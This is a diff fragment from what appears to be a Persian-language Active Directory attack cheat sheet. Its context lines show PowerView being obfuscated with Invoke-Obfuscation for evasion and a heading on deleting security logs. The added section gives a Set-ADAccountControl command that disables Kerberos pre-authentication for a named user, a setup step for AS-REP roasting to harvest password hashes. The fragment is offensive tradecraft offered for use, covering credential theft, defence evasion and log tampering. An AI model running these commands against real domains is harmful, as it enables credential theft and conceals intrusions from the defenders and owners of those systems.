@@ -731,6 +731,12 @@ Import-Module .\Invoke-Obfuscation\Invoke-Obfuscation.psm1
 Out-ObfuscatedTokenCommand -Path .\powerview.ps1 | Out-File out
 ```
 
+### دریافت اطلاعات هویتی AD با استفاده از doesnotrequirepreauth
+
+```text
+Set-ADAccountControl -identity jorden -doesnotrequirepreauth 1
+```
+
 ### حذف گزارشات امنیت و برنامه ها\(برای SVR01\)
 
 ```text
